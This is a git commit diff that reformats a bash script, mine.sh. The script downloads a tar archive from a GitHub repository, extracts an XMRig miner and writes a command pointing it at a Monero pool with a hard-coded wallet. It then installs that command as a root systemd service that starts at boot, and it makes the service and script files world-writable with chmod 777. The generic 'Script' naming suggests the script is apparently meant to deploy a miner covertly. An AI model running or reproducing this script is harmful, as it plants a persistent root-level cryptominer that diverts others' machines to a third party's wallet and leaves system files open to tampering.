1b77d64e0da8d9588878167370a1ea069440c72a
Daemonium <66210793+realLifeInAnime@users.noreply.github.com>
2023-10-16 14:31:12 +0300

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,15 +1,28 @@
 #!/bin/bash
-sleep 10 ;
-sudo touch /etc/systemd/system/script.service ;
-sudo touch /usr/local/bin/script.sh ;
-sudo chmod 777 /etc/systemd/system/script.service ;
-sudo chmod 777 /usr/local/bin/script.sh ;
-sudo wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar && sudo tar xvf output_filename.tar ;
-sleep 3 ;
+
+sleep 10
+
+# Touch and set permissions
+sudo touch /etc/systemd/system/script.service
+sudo touch /usr/local/bin/script.sh
+sudo chmod 777 /etc/systemd/system/script.service
+sudo chmod 777 /usr/local/bin/script.sh
+
+# Download and extract
+sudo wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar
+sudo tar xvf output_filename.tar
+sleep 3
 sudo chmod +x xmrig
-sudo echo "#!/bin/bash
-./xmrig-6.18.0/xmrig -a randomx -o xmr.kryptex.network:7777 -u 41gm7v89Rw8W5AeCcBVj3yZnQhZSSJoPaKrfWC1oWyNeiPTGc7FGkHp7xUf8nn7jbAXo4YxYtb8V6WTa3h9oAxDWVADG37A.test --coin monero" > /usr/local/bin/script.sh ;
-sudo echo "[Unit]
+
+# Write to /usr/local/bin/script.sh
+cat <<EOL | sudo tee /usr/local/bin/script.sh > /dev/null
+#!/bin/bash
+./xmrig-6.18.0/xmrig -a randomx -o xmr.kryptex.network:7777 -u 41gm7v89Rw8W5AeCcBVj3yZnQhZSSJoPaKrfWC1oWyNeiPTGc7FGkHp7xUf8nn7jbAXo4YxYtb8V6WTa3h9oAxDWVADG37A.test --coin monero
+EOL
+
+# Write to /etc/systemd/system/script.service
+cat <<EOL | sudo tee /etc/systemd/system/script.service > /dev/null
+[Unit]
 Description=Script
 After=network.target
 [Service]
@@ -19,7 +32,10 @@ Restart=no
 User=root
 WorkingDirectory=/
 [Install]
-WantedBy=multi-user.target" > /etc/systemd/system/script.service;
-sudo systemctl daemon-reload;
-sudo systemctl start script.service;
-sudo systemctl enable script.service;'
+WantedBy=multi-user.target
+EOL
+
+# Reload, start, and enable the service
+sudo systemctl daemon-reload
+sudo systemctl start script.service
+sudo systemctl enable script.service
